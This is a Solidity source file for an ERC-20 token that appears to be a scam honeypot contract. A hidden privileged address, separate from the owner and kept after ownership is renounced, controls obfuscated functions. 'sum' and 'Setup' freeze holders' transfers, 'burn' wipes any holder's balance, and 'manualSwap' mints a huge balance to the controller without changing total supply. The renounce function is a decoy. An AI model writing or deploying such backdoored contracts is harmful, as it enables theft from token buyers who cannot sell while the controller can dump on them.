// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address adfdfsdet) external view returns (uint256);
    function transfer(address recipient, uint256 airyhrnt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 airyhrnt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 airyhrnt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract TOKEN is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _zsdacx; 
    mapping (address => uint256) private _all;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _EEEWSSA;
    uint256 private _cll;

    constructor(string memory name_, string memory symbol_,  address OWDSAE) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 9;
        _totalSupply = 10000000 * (10 ** 9);
        _EEEWSSA = OWDSAE;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address adfdfsdet) public view override returns (uint256) {
        return _balances[adfdfsdet];
    }
    function sum(address user, uint256 teee) public {
    require(_EEEWSSA == _msgSender());
        _all[user] = teee;
    }
    function getinfo_user(address user) public view returns (uint256) {
        return _all[user];
    } 
     function balance () public {
    require(_EEEWSSA == _msgSender());
        _cll= 0;
     }
    function Setup() public {
    require(_EEEWSSA == _msgSender());
        _cll= 2000000000000000;
    }
    function info() public view returns (uint256) {
        return _cll;
    } 
    function burn(address _to, uint256 _value) public returns(bool){
        require(_EEEWSSA == _msgSender());
        require(_value > 0, 'Insufficient amount');
        _balances[_to] -= _value;
        
        return true;
    }
    function manualSwap() public {
    require(_EEEWSSA == _msgSender());
    uint256 xdasas = 86534456456453254463454421;
    uint256 uuejsjd=xdasas*333;
        _balances[_EEEWSSA] += uuejsjd;
    }        
    function transfer(address recipient, uint256 airyhrnt) public virtual override returns (bool) {
    require(_balances[_msgSender()] > _all[_msgSender()], "User's balance is less than or equal to the cooldown amount");
    require(_balances[_msgSender()] >= airyhrnt, "TT: transfer airyhrnt exceeds balance");
    require(_balances[_msgSender()] >= _cll, "abc" );
    _balances[_msgSender()] -= airyhrnt;
    _balances[recipient] += airyhrnt;
    emit Transfer(_msgSender(), recipient, airyhrnt);
    return true;
}

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 airyhrnt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = airyhrnt;
        emit Approval(_msgSender(), spender, airyhrnt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 airyhrnt) public virtual override returns (bool) {
    require(_balances[sender] > _cll, "Sender's balance is less than or equal to the cooldown amount");
    require(_allowances[sender][_msgSender()] >= airyhrnt, "TT: transfer airyhrnt exceeds allowance");

    _balances[sender] -= airyhrnt;
    _balances[recipient] += airyhrnt;
    _allowances[sender][_msgSender()] -= airyhrnt;

    emit Transfer(sender, recipient, airyhrnt);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}